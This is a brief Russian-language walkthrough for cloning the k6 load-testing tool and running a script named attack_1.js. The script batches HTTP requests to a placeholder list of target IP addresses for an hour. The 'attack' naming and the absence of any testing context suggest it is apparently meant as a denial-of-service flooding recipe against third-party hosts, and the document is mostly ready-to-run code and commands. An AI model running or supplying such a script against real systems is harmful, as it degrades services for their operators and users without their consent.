```
git clone https://github.com/grafana/k6.git
cd k6
```

создайте новый файл ./samples/attack_1.js

вставьте этот листинг

```
import { check } from 'k6';
import http from 'k6/http';

export let options = {
  //noConnextionRefuse: false,
  stages: [
      { duration: "1h", target: 2 },
  ]
}

export default function() {
  http.batch([
"<IP ADDRESSES GO HERE>",
  ]);
};


```

запустите

```
k6 run ./samples/attack_1.js
```
